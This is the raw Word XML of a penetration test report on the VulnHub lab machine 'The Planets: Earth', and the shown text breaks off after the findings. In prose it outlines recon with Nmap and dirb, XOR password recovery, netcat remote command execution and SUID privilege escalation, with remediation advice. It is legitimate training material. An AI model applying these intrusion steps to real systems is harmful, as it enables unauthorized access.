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B3EF7" w14:textId="77777777" w:rsidR="00E1219F" w:rsidRDefault="00E1219F">
      <w:pPr>
        <w:pStyle w:val="Title"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7419358D" w14:textId="77777777" w:rsidR="00E1219F" w:rsidRDefault="00E1219F">
      <w:pPr>
        <w:pStyle w:val="Title"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="52E808DD" w14:textId="77777777" w:rsidR="00E1219F" w:rsidRDefault="00E1219F">
      <w:pPr>
        <w:pStyle w:val="Title"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2C5495AB" w14:textId="77777777" w:rsidR="00E1219F" w:rsidRDefault="00E1219F">
      <w:pPr>
        <w:pStyle w:val="Title"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="17891831" w14:textId="77777777" w:rsidR="00E1219F" w:rsidRDefault="00E1219F">
      <w:pPr>
        <w:pStyle w:val="Title"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="059C5E1D" w14:textId="77777777" w:rsidR="00E1219F" w:rsidRDefault="00E1219F">
      <w:pPr>
        <w:pStyle w:val="Title"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="739155FD" w14:textId="77777777" w:rsidR="00E1219F" w:rsidRDefault="00E1219F">
      <w:pPr>
        <w:pStyle w:val="Title"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="76AC4B94" w14:textId="5AD3347C" w:rsidR="00386BE8" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Title"/>
      </w:pPr>
      <w:r>
        <w:t>Penetration Test Report for "The Planets: Earth" CTF Challenge</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FFFE5E4" w14:textId="77777777" w:rsidR="00E1219F" w:rsidRDefault="00E1219F"/>
    <w:p w14:paraId="06ABE811" w14:textId="4723451A" w:rsidR="00386BE8" w:rsidRDefault="00000000">
      <w:r>
        <w:t xml:space="preserve">Date(s) of Test: </w:t>
      </w:r>
      <w:r w:rsidR="00E1219F">
        <w:t>04/09/2024</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Name of the Test: "The Planets: Earth" CTF Challenge Penetration Test</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">Author: </w:t>
      </w:r>
      <w:r w:rsidR="00E1219F">
        <w:t>Julio Ribeiro Barros</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D5A047B" w14:textId="77777777" w:rsidR="00E1219F" w:rsidRDefault="00E1219F"/>
    <w:p w14:paraId="7D03E1E8" w14:textId="77777777" w:rsidR="00E1219F" w:rsidRDefault="00E1219F">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="431747FE" w14:textId="77777777" w:rsidR="00E1219F" w:rsidRDefault="00E1219F">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="028FB60E" w14:textId="77777777" w:rsidR="00E1219F" w:rsidRDefault="00E1219F" w:rsidP="00E1219F"/>
    <w:p w14:paraId="0893E144" w14:textId="77777777" w:rsidR="00E1219F" w:rsidRDefault="00E1219F" w:rsidP="00E1219F"/>
    <w:p w14:paraId="20781341" w14:textId="77777777" w:rsidR="00E1219F" w:rsidRDefault="00E1219F" w:rsidP="00E1219F"/>
    <w:p w14:paraId="1D5BA1B4" w14:textId="77777777" w:rsidR="00E1219F" w:rsidRPr="00E1219F" w:rsidRDefault="00E1219F" w:rsidP="00E1219F"/>
    <w:p w14:paraId="6C8A47F7" w14:textId="755E70B8" w:rsidR="00386BE8" w:rsidRPr="00CF74B0" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Table of Contents</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FF7C040" w14:textId="7C8C16EF" w:rsidR="00386BE8" w:rsidRPr="00CF74B0" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Executive Summary - [</w:t>
      </w:r>
      <w:r w:rsidR="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t>Scope / Purpose - [</w:t>
      </w:r>
      <w:r w:rsidR="00CF74B0" w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t>Methodology - [</w:t>
      </w:r>
      <w:r w:rsidR="00CF74B0" w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
        <w:t>Findings / Recommendations / Technical Details - [</w:t>
      </w:r>
      <w:r w:rsidR="00CF74B0" w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00CF74B0" w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Step-by-Step [6-13]</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="56B4BCC5" w14:textId="77777777" w:rsidR="00CF74B0" w:rsidRDefault="00CF74B0"/>
    <w:p w14:paraId="0DE65D12" w14:textId="77777777" w:rsidR="00CF74B0" w:rsidRDefault="00CF74B0"/>
    <w:p w14:paraId="1BDDD543" w14:textId="77777777" w:rsidR="00CF74B0" w:rsidRDefault="00CF74B0"/>
    <w:p w14:paraId="652946C0" w14:textId="77777777" w:rsidR="00CF74B0" w:rsidRDefault="00CF74B0"/>
    <w:p w14:paraId="4A8A0225" w14:textId="77777777" w:rsidR="00CF74B0" w:rsidRDefault="00CF74B0"/>
    <w:p w14:paraId="1166782E" w14:textId="77777777" w:rsidR="00CF74B0" w:rsidRDefault="00CF74B0"/>
    <w:p w14:paraId="320DB044" w14:textId="77777777" w:rsidR="00CF74B0" w:rsidRDefault="00CF74B0"/>
    <w:p w14:paraId="13839100" w14:textId="77777777" w:rsidR="00CF74B0" w:rsidRDefault="00CF74B0"/>
    <w:p w14:paraId="782E9161" w14:textId="77777777" w:rsidR="00CF74B0" w:rsidRDefault="00CF74B0"/>
    <w:p w14:paraId="788CCDB9" w14:textId="77777777" w:rsidR="00CF74B0" w:rsidRDefault="00CF74B0"/>
    <w:p w14:paraId="1135589E" w14:textId="77777777" w:rsidR="00CF74B0" w:rsidRDefault="00CF74B0"/>
    <w:p w14:paraId="69DB826B" w14:textId="77777777" w:rsidR="00CF74B0" w:rsidRDefault="00CF74B0"/>
    <w:p w14:paraId="69291C6A" w14:textId="77777777" w:rsidR="00CF74B0" w:rsidRDefault="00CF74B0"/>
    <w:p w14:paraId="0C5ED6B7" w14:textId="77777777" w:rsidR="00CF74B0" w:rsidRDefault="00CF74B0"/>
    <w:p w14:paraId="5420172A" w14:textId="77777777" w:rsidR="00CF74B0" w:rsidRDefault="00CF74B0"/>
    <w:p w14:paraId="2F7F32F4" w14:textId="77777777" w:rsidR="00CF74B0" w:rsidRDefault="00CF74B0"/>
    <w:p w14:paraId="5188D083" w14:textId="77777777" w:rsidR="00CF74B0" w:rsidRDefault="00CF74B0"/>
    <w:p w14:paraId="7EA5C6F0" w14:textId="77777777" w:rsidR="00CF74B0" w:rsidRDefault="00CF74B0"/>
    <w:p w14:paraId="4F672DBF" w14:textId="77777777" w:rsidR="00CF74B0" w:rsidRDefault="00CF74B0"/>
    <w:p w14:paraId="2E9711EC" w14:textId="77777777" w:rsidR="00386BE8" w:rsidRPr="00CF74B0" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Executive Summary</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="202551EB" w14:textId="77777777" w:rsidR="00E1219F" w:rsidRPr="00CF74B0" w:rsidRDefault="00E1219F" w:rsidP="00E1219F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">This report details the extensive discoveries and techniques used in the penetration test of the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>VulnHub</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>-hosted Capture the Flag (CTF) challenge "The Planets: Earth." This exercise's main goal was to improve penetration testing abilities by simulating real-world network environments and vulnerabilities in a controlled setting.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51C6ED5D" w14:textId="77777777" w:rsidR="00E1219F" w:rsidRPr="00CF74B0" w:rsidRDefault="00E1219F" w:rsidP="00E1219F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">The information gathering, user password retrieval, target system connection, and root account access phases comprised the four systematic phases of the penetration test. With a variety of cybersecurity tools, such as </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>netdiscover</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">, Nmap, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>dirb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">, and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>netcat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>, our team was able to map out the target network, find running services, and find possible security holes.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56098153" w14:textId="77777777" w:rsidR="00E1219F" w:rsidRPr="00CF74B0" w:rsidRDefault="00E1219F" w:rsidP="00E1219F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Important test results included vulnerable services on open ports, sensitive data exposed by improperly configured directories, and information exposed due to inadequate encryption techniques. Furthermore, unauthorized privilege escalation was made possible by the successful exploitation of file permission misconfigurations.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DE948B8" w14:textId="3AB4F161" w:rsidR="00E1219F" w:rsidRDefault="00E1219F" w:rsidP="00E1219F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Our team suggests taking urgent corrective action right away, such as guarding service ports, putting strong encryption in place, limiting the execution of encoded commands, and routinely auditing file permissions. To strengthen the security posture and reduce the likelihood of further attacks, these actions are essential.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52FF4F4A" w14:textId="77777777" w:rsidR="00CF74B0" w:rsidRPr="00CF74B0" w:rsidRDefault="00CF74B0" w:rsidP="00E1219F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6A85006A" w14:textId="77777777" w:rsidR="00386BE8" w:rsidRPr="00CF74B0" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Scope / Purpose</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C10A64B"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The "Earth" virtual machine, which is a part of The Planets series that is accessible on </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>VulnHub</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>, was the subject of the penetration test that is detailed in this report. The machine served as a simulation for the test, which sought to find and take advantage of weak points in this carefully crafted configuration.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="038BD916" w14:textId="6364F3F7"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The target machine's IP address, 192.168.10.13, was discovered </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>through the use of</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>netdiscover</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> tool during initial reconnaissance, indicating that it was a part of a local network. After that, a thorough scan was conducted using Nmap, revealing multiple open ports—22 for SSH, 80 for HTTP, and 443 for HTTPS—all of which were deemed to be within the penetration test's purview.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07E71E77" w14:textId="77777777" w:rsidR="00CF74B0" w:rsidRPr="00CF74B0" w:rsidRDefault="00CF74B0" w:rsidP="00191EF7">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3290A402" w14:textId="77777777" w:rsidR="00CF74B0" w:rsidRPr="00CF74B0" w:rsidRDefault="00CF74B0" w:rsidP="00191EF7">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="39A29053" w14:textId="77777777" w:rsidR="00CF74B0" w:rsidRPr="00CF74B0" w:rsidRDefault="00CF74B0" w:rsidP="00191EF7">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="68B87C1E" w14:textId="77777777" w:rsidR="00CF74B0" w:rsidRPr="00CF74B0" w:rsidRDefault="00CF74B0" w:rsidP="00191EF7">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="758F2573" w14:textId="77777777" w:rsidR="00CF74B0" w:rsidRPr="00CF74B0" w:rsidRDefault="00CF74B0" w:rsidP="00191EF7">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0F8889D9" w14:textId="77777777" w:rsidR="00386BE8" w:rsidRPr="00CF74B0" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Methodology</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="775EFC40" w14:textId="7B30A91F"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To locate the target's IP address and count open ports, as well as identify the services that are running on these ports, the information gathering phase made use of the tools </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>netdiscover</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> and Nmap. During the vulnerability scanning phase, possible directories and file paths that could be exploited on the target system were brute-forced using </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>dirb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26BF5488" w14:textId="4870120C" w:rsidR="00191EF7" w:rsidRPr="00CF74B0" w:rsidRDefault="00191EF7" w:rsidP="00191EF7">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>CyberChef</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> tool and XOR encryption were essential for cryptanalysis to decrypt and retrieve user passwords from encrypted messages. Using </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>netcat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> to run encoded commands and get past security measures to obtain unauthorized access, the exploitation phase tested the network's protections against remote connections.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CC61577"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The process of approaching privilege escalation involved looking for files with SUID permission that the '</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>apache</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>' user could exploit. This led to the discovery of an exploitable file that made it possible to reset the root password. After establishing a persistent shell and conducting a methodical directory search to find user and root flags, the last phase involved persistence and lateral movement.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43F98CB7" w14:textId="245EA6E4" w:rsidR="00191EF7" w:rsidRPr="00CF74B0" w:rsidRDefault="00191EF7" w:rsidP="00191EF7">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Numerous significant vulnerabilities were exposed by the penetration test results. The target machine was discovered to have open ports, particularly ports 22 (SSH), 80 (HTTP), and 443 (HTTPS). As a result, it was advised that these service ports be regularly scanned for vulnerabilities. The identification of critical directories brought to light the necessity of protecting them and putting strong defenses in place against directory traversal attacks.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67A007DA" w14:textId="77777777" w:rsidR="00191EF7" w:rsidRPr="00CF74B0" w:rsidRDefault="00191EF7" w:rsidP="00191EF7">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Our cryptanalysis revealed that some messages were encrypted with a simple XOR cipher; as a result, we advise using stronger encryption methods and taking precautions to prevent encryption keys from being compromised. Additionally, we found that encoded commands could be executed remotely. This led to suggestions to limit the ability to execute encoded commands remotely and to keep an eye out for unauthorized outbound connections.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E4120D6" w14:textId="29A5EB6E" w:rsidR="00191EF7" w:rsidRPr="00CF74B0" w:rsidRDefault="00191EF7" w:rsidP="00191EF7">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CF74B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>We recommend routine audits of file permissions in accordance with the principle of least privilege after discovering a crucial file with incorrect permissions that enabled privilege escalation. In conclusion, the fact that we were able to change the root password emphasizes how crucial it is to keep an eye on all system scripts and binaries—especially those that grant root access—to stop further illegal escalations.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="363D506C" w14:textId="77777777" w:rsidR="00191EF7" w:rsidRDefault="00191EF7">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
